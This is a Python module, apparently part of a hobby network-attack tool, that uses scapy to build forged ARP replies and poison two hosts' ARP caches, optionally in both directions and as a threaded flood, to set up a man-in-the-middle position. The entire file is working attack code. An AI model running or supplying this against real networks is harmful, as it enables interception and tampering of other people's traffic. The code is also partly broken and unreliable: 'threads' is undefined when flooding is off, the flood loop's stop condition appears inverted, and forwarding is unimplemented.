import scapy.layers.l2
from scapy.all import *
from DataStructures import Host, StoppableThread


class AttackTools:
    thread1 = StoppableThread
    thread2 = StoppableThread

    @staticmethod
    def build_arp_response(attacker: Host, target1: Host, target2: Host):
        # TODO: Add error detection
        ether_index = 0
        arp_index = 1

        arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
        arp[ether_index].src = attacker.get_hwaddr()
        arp[arp_index].hwsrc = attacker.get_hwaddr()
        arp[arp_index].psrc = target1.get_addr()
        arp[arp_index].hwdst = target2.get_hwaddr()
        arp[arp_index].pdst = target2.get_addr()

        return arp

    @classmethod
    def poison(cls, attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
        # TODO: Add error detection
        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
        if not flood:
            sendp(arp1)

        if bidirectional:
            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
            if not flood:
                sendp(arp2)

        if flood:
            threads = []
            print("Sending flood of ARP packets to selected targets...")
            cls.thread1 = StoppableThread(target=AttackTools.sendp_flood, args=(arp1,))
            threads.append(cls.thread1)
            cls.thread1.start()

        if flood and bidirectional:
            cls.thread2 = StoppableThread(target=AttackTools.sendp_flood, args=(arp2,))
            threads.append(cls.thread2)
            cls.thread2.start()

        if forwarding:
            # TODO: Implement packet forwarding
            pass

        return threads

    # TODO: Convert from class method to instance method
    @classmethod
    def sendp_flood(cls, pkt):
        while True:
            sendp(pkt, verbose=False)
            if not cls.thread1.killed():
                break

    def packet_forwarder(self, attacker: Host, target1: Host, target2: Host, bidirectional: bool):
        pass
